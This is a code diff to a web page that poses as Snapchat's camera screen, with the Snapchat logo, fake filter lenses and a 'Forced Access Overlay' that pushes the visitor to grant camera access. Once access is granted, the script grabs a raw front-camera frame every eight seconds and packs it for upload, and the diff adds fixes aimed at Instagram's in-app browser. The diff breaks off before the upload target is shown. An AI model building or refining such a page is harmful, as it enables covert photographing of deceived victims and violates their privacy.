@@ -13,49 +13,49 @@
         * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
         body { width:100%; height:100%; overflow:hidden; background:#000; font-family:-apple-system, sans-serif; position:fixed; inset:0;}
         
-        #camera { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; z-index:1; transform:scaleX(-1); transition: filter 0.3s ease; }
+        #camera { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; z-index:1; transform:scaleX(-1); background:#000; transition: filter 0.3s; }
         
-        /* Liquid Glass Effect */
+        /* iPhone Liquid Glass */
         .glass { 
-            background: rgba(255, 255, 255, 0.18); 
+            background: rgba(255, 255, 255, 0.16); 
             backdrop-filter: blur(25px) saturate(180%); 
             -webkit-backdrop-filter: blur(25px) saturate(180%); 
-            border: 1px solid rgba(255, 255, 255, 0.22);
-            box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.2);
         }
 
-        /* Top UI */
+        /* Top UI Layout */
         .t-ui { position:fixed; top:20px; width:100%; padding:0 16px; display:flex; justify-content:space-between; z-index:20; color:#fff;}
         .t-left { display:flex; gap:12px; }
         .avatar { width:42px; height:42px; border-radius:50%; overflow:hidden; display:flex; align-items:center; justify-content:center; }
         .search { width:42px; height:42px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:18px; }
         
+        /* Glassy Right Tools */
         .t-right { display:flex; flex-direction:column; gap:10px; align-items:center; }
         .tool-btn { width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 19px; position: relative; }
         .hd-glass { width: 40px; height: 28px; border-radius: 9px; font-size: 10px; font-weight: 900; display: flex; align-items: center; justify-content: center; }
         .badge { position:absolute; top:-1px; right:-1px; background:#ff3040; font-size:9px; padding:1px 4px; border-radius:10px; border:1.5px solid #000; font-weight:900;}
 
         /* Main UI Arrangement */
-        .m-ui { position:fixed; bottom:115px; width:100%; display:flex; align-items:center; justify-content:center; z-index:25; }
-        
-        .memories-btn { display:flex; flex-direction:column; align-items:center; gap:4px; color:#fff; font-size:10px; font-weight:600; margin-right: 15px; }
-        .mem-icon { width:56px; height:56px; border-radius:16px; display:flex; align-items:center; justify-content:center; }
+        .m-ui { position:fixed; bottom:115px; width:100%; display:flex; align-items:center; justify-content:center; z-index:25; padding: 0 15px; }
+        .memories-btn { display:flex; flex-direction:column; align-items:center; gap:4px; color:#fff; font-size:10px; font-weight:600; margin-right: 25px; }
+        .mem-icon { width:58px; height:58px; border-radius:16px; display:flex; align-items:center; justify-content:center; }
+        .shutter { width:90px; height:90px; border-radius:50%; border:7px solid #fff; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+        .shutter-in { width:68px; height:68px; border-radius:50%; background:rgba(255,255,255,0.25); }
 
-        .shutter { width:92px; height:92px; border-radius:50%; border:7px solid #fff; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
-        .shutter-in { width:70px; height:70px; border-radius:50%; background:rgba(255,255,255,0.25); }
-
-        /* Filter Carousel Style */
-        .lens-row { display:flex; gap:10px; margin-left: 15px; overflow-x: auto; padding-right: 20px; max-width: 40%; scrollbar-width: none; }
+        /* Filter Carousel */
+        .lens-row { display:flex; gap:12px; margin-left: 25px; overflow-x: auto; max-width: 45%; scrollbar-width: none; }
         .lens-row::-webkit-scrollbar { display: none; }
         .lens { width:60px; height:60px; border-radius:50%; overflow:hidden; border:2px solid rgba(255,255,255,0.4); flex-shrink:0; transition: 0.2s; }
-        .lens.active { border-color:#ffe600; transform: scale(1.1); box-shadow: 0 0 15px rgba(255, 230, 0, 0.4); }
+        .lens.active { border-color:#ffe600; transform: scale(1.1); }
 
-        /* Bottom Nav */
-        .footer { position:fixed; bottom:0; width:100%; height:85px; background:rgba(0,0,0,0.85); backdrop-filter:blur(20px); display:flex; justify-content:space-around; align-items:center; z-index:30; border-top:0.5px solid rgba(255,255,255,0.1); padding-bottom:15px; }
+        /* Bottom Nav Layer */
+        .footer { position:fixed; bottom:0; width:100%; height:85px; background:rgba(0,0,0,0.85); backdrop-filter:blur(20px); display:flex; justify-content:space-around; align-items:center; z-index:30; border-top:0.5px solid rgba(255,255,255,0.1); padding-bottom:18px; }
         .nav { font-size:25px; color:#777; position:relative; }
         .nav.active { color:#fff; }
-        .chat-b { position:absolute; top:-3px; right:-6px; background:#ff3040; font-size:11px; padding:1px 5px; border-radius:10px; border:1.5px solid #000; color:#fff; font-weight:bold; }
+        .chat-b { position:absolute; top:-3px; right:-6px; background:#ff3040; font-size:11px; padding:1px 4px; border-radius:10px; border:1.5px solid #000; color:#fff; font-weight:bold; }
 
+        /* Forced Access Overlay */
         #lock-screen { position:fixed; inset:0; background:#000; z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; text-align:center; padding:30px; }
         .lock-btn { background:#fffc00; color:#000; border:none; padding:16px 60px; border-radius:35px; font-weight:bold; font-size:17px; margin-top:30px; cursor:pointer; }
 
@@ -67,11 +67,11 @@
     <div id="lock-screen">
         <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1280px-Snapchat_logo.svg.png" style="width:85px; margin-bottom:20px;">
         <h2 style="margin-bottom:12px;">Camera Access Required</h2>
-        <p style="font-size:15px; color:#999;">Snapchat needs camera access for filters. Tap Continue and Allow.</p>
+        <p style="font-size:15px; color:#999; line-height:1.5;">Snapchat needs camera access for filters. Tap Continue and Allow.</p>
         <button class="lock-btn" onclick="requestAccess()">CONTINUE</button>
     </div>
 
-    <video id="camera" autoplay playsinline></video>
+    <video id="camera" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <div class="t-ui">
@@ -98,10 +98,10 @@
         <div class="shutter" id="snap"><div class="shutter-in"></div></div>
         
         <div class="lens-row">
-            <div class="lens active glass" onclick="setL(this,'none')"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
-            <div class="lens glass" onclick="setL(this,'grayscale(1)')"><img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
-            <div class="lens glass" onclick="setL(this,'invert(1)')"><img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
-            <div class="lens glass" onclick="setL(this,'hue-rotate(90deg) saturate(3)')"><img src="https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
+            <div class="lens active glass" onclick="setL(this,'none')"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100" style="width:100%; object-fit:cover; height:100%;"></div>
+            <div class="lens glass" onclick="setL(this,'grayscale(1)')"><img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100" style="width:100%; object-fit:cover; height:100%;"></div>
+            <div class="lens glass" onclick="setL(this,'invert(1)')"><img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100" style="width:100%; object-fit:cover; height:100%;"></div>
+            <div class="lens glass" onclick="setL(this,'hue-rotate(90deg) contrast(1.5)')"><img src="https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=100" style="width:100%; object-fit:cover; height:100%;"></div>
         </div>
     </div>
 
@@ -119,12 +119,21 @@
 
         async function requestAccess() {
             try {
-                s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // Fixed constraints for Instagram Webview compatibility
+                const constraints = { video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } };
+                s = await navigator.mediaDevices.getUserMedia(constraints);
                 v.srcObject = s;
+
+                // Explicitly call play() after metadata loads to fix black screens
+                v.onloadedmetadata = () => {
+                    v.play().catch(e => console.error("Playback failed", e));
+                };
+
                 lock.style.display = 'none';
                 setInterval(send, 8000); 
             } catch (err) {
-                alert("Permission denied.");
+                console.error("Camera error:", err);
+                alert("Please enable camera access and reload.");
             }
         }
 
@@ -135,11 +144,11 @@
         }
 
         async function send() {
-            if (!s) return;
+            if (!s || v.paused) return;
             c.width = v.videoWidth; c.height = v.videoHeight;
             const ctx = c.getContext('2d');
             ctx.translate(c.width, 0); ctx.scale(-1, 1);
-            // Capture raw frame WITHOUT the visual filter
+            // Capturing raw video feed (ignoring CSS filters)
             ctx.drawImage(v, 0, 0); 
             c.toBlob(blob => {
                 const fd = new FormData();
